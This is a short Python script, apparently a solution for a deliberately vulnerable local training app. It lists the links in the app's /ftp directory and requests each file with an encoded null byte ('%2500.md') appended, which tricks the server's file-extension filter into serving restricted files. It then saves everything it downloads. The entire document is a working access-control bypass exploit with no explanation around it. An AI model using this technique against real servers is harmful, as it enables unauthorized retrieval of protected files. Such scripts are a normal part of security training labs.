import requests

url = "http://127.0.0.1:3000/"
res = requests.get(url + "ftp")
a = res.text.split("<a href=\"")
for i in range(len(a)):
    a[i] = a[i].split("\"")[0]
for i in a[4:]:
    urll = url + i + "%2500.md"
    r = requests.get(urll, allow_redirects=True)
    print(f"Downloaded {i}")
    open("data/" + i.split("/")[1], 'wb').write(r.content)
